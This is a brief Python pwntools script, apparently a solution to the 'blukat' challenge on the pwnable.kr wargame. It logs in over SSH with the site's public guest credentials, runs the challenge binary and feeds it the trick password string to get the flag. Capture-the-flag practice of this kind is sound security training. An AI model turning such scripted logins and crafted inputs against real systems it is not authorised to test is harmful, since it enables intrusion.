from pwn import *
import random

shell = ssh('blukat', 'pwnable.kr', 2222, password='guest')
sh = shell.process('./blukat')

_ = sh.recvline()
password = 'cat: password: Permission denied\n'
sh.sendline(password)
print(sh.recvline())
